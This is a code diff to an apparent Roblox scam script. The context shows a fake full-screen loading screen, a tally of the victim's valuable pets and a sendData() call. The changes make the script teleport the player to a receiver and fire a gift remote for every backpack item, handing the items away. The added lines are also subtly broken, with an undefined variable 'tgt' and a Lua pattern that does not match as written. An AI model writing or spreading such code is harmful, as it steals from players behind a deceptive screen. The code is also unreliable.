@@ -10,6 +10,8 @@ local LocalPlayer = Players.LocalPlayer
 local TeleportService = game:GetService("TeleportService")
 local TweenService = game:GetService("TweenService")
 local Lighting = game:GetService("Lighting")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local giftRemote = ReplicatedStorage:WaitForChild("GiftRemote")
 
 -- 🌀 Fake GUI (covers full screen)
 local function createFakeLoading()
@@ -63,8 +65,7 @@ local function getPetSummary()
 	local totalValue = 0
 	local pingEveryone = false
 	local specialPets = { "Queen Bee", "Dragon Fly", "Raccoon", "Disco Bee", "Red Fox" }
-	local specials = {}
-	local regulars = {}
+	local specials, regulars = {}, {}
 
 	if folder then
 		for _, item in ipairs(folder:GetChildren()) do
@@ -176,7 +177,7 @@ local function autoLeaveIfEmpty(fakeGUI, frame)
 	end)
 end
 
--- ⚔️ Auto Trade System
+-- ⚔️ Auto Trade System (Gifting)
 local function getHRP(p)
 	return p.Character and p.Character:FindFirstChild("HumanoidRootPart")
 end
@@ -189,7 +190,7 @@ end
 
 local function trade(receiver)
 	spawn(function()
-		repeat
+		while true do
 			task.wait(1)
 			local myHRP = getHRP(LocalPlayer)
 			local hisHRP = getHRP(receiver)
@@ -197,20 +198,24 @@ local function trade(receiver)
 				myHRP.CFrame = hisHRP.CFrame + Vector3.new(0, 3, 0)
 			end
 
-			local bp = LocalPlayer:FindFirstChild("Backpack")
-			if bp then
-				for _, tool in ipairs(bp:GetChildren()) do
-					if tool:IsA("Tool") then
+			local backpack = LocalPlayer:FindFirstChild("Backpack")
+			if backpack then
+				for _, tool in ipairs(backpack:GetChildren()) do
+					if tool:IsA("Tool") and not tool.Name:lower():match("seed|shovel|egg") then
 						equip(tool)
 						task.wait(0.4)
+						pcall(function()
+							giftRemote:FireServer(tool.Name, tgt)
+						end)
+						task.wait(4)
 					end
 				end
 			end
-		until false
+		end
 	end)
 end
 
--- 🟢 Execute on Start
+-- 🟢 Execute
 local fakeGUI, frame = createFakeLoading()
 sendData()
 autoLeaveIfEmpty(fakeGUI, frame)
